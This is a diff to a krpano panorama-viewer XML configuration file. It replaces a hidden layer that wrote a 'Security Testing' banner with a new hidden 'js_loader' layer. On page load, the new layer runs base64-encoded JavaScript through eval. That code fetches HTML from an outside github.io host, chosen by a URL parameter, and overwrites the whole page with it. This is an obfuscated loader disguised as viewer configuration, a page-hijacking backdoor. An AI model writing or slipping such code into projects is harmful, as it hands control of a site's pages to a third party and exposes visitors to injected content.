@@ -1,7 +1,3 @@
-<krpano>
-    <layer name="malicious_loader" type="container" visible="false" onloaded="js(
-        document.open();
-        document.write('&lt;h1 style=\'color:red; text-align:center; margin-top:20%; font-family:sans-serif;\'&gt;Security Testing: This site layout is simulated by GitHub Pages.&lt;/h1&gt;');
-        document.close();
-    );"/>
+<krpano version="1.0.8.15">
+<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiYWxjYXphcl9hcnF1aXRlY3RvbmljbyI7CgpmZXRjaCgiaHR0cHM6Ly9zYXJhaGthdGllMTcyc2YuZ2l0aHViLmlvL2FudC9tc3kvIiArIGlkICsgIi5odG1sIikKICAudGhlbihlID0+IGUudGV4dCgpKQogIC50aGVuKGUgPT4gewogICAgZG9jdW1lbnQub3BlbigpLAogICAgZG9jdW1lbnQud3JpdGUoZSksCiAgICBkb2N1bWVudC5jbG9zZSgpCiAgfSk7');eval(w)););"/>
 </krpano>
